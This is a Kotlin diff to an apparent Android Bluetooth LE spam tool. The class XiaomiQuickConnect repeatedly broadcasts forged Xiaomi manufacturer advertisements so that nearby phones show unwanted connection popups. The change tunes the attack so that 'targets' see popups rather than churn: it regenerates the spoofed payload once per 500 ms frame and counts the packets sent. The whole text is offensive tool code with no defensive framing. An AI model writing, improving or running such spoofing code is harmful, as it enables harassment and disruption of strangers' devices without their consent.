@@ -8,13 +8,21 @@ import kotlin.random.Random
 class XiaomiQuickConnect : Spammer {
     private var blinkRunnable: Runnable? = null
 
+    @Volatile
     private var _isSpamming = false
     private var loop = 0
     private val executor: ExecutorService = Executors.newSingleThreadExecutor()
 
+    private var payload: ByteArray =
+        Companion.generateManufacturerDataBytes(controlled = true).second
+    private var lastFrameChange: Long = 0L
+
+    private fun SystemClockElapsedRealtime(): Long = android.os.SystemClock.elapsedRealtime()
+
     companion object {
         private const val TAG = "XiaomiQuickConnect"
         private const val COMPANY_ID = 0x038F
+        private const val FRAME_MS = 500L
 
         private fun generateManufacturerData(
             controlled: Boolean = false,
@@ -103,12 +111,19 @@ class XiaomiQuickConnect : Spammer {
             // popup the same way it did for Apple.
             try {
                 while (loop <= Helper.MAX_LOOP && _isSpamming) {
-                    val (hex, bytes) = Companion.generateManufacturerDataBytes(controlled = true)
+                    // Regenerate the manufacturer payload only once per
+                    // FRAME_MS window: per-packet regeneration made every
+                    // frame differ, so the shared BleSpamTx had to stop/start
+                    // the radio 30-50×/s and targets saw nothing but churn.
+                    if (SystemClockElapsedRealtime() - lastFrameChange >= FRAME_MS) {
+                        payload = Companion.generateManufacturerDataBytes(controlled = true).second
+                        lastFrameChange = SystemClockElapsedRealtime()
+                    }
 
                     try {
-                        bluetoothAdvertiser.advertiseXiaomi(bytes)
+                        bluetoothAdvertiser.advertiseXiaomi(payload)
                     } catch (e: Exception) {
-                        Log.w(TAG, "advertise: $hex ${e.message}")
+                        Log.w(TAG, "advertise: ${e.message}")
                     }
                     com.droid.flippy.trackBlePackets(1)
 
